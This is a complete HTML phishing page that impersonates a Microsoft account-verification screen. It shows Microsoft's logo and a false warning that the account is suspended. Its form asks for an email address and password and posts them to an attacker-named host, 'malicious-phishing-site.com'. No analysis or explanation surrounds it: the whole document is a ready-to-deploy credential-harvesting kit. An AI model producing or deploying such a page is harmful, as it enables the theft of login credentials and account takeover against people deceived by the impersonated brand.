<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Important Account Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f7f7f7; }
        .container { max-width: 400px; margin: 60px auto; background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .logo { display: block; margin: 0 auto 20px; width: 80px; }
        h2 { color: #d9534f; text-align: center; }
        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; margin-bottom: 6px; }
        .input-group input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; }
        .btn { width: 100%; background: #007bff; color: #fff; border: none; padding: 12px; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .btn:hover { background: #0056b3; }
        .warning { color: #d9534f; font-size: 15px; text-align: center; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" class="logo">
        <h2>Account Verification Required</h2>
        <div class="warning">Your account access is temporarily suspended. Please verify your credentials to restore access.</div>
        <form action="http://malicious-phishing-site.com/submit" method="POST">
            <div class="input-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" required>
            </div>
            <div class="input-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="btn">Verify Account</button>
        </form>
    </div>
</body>
</html>
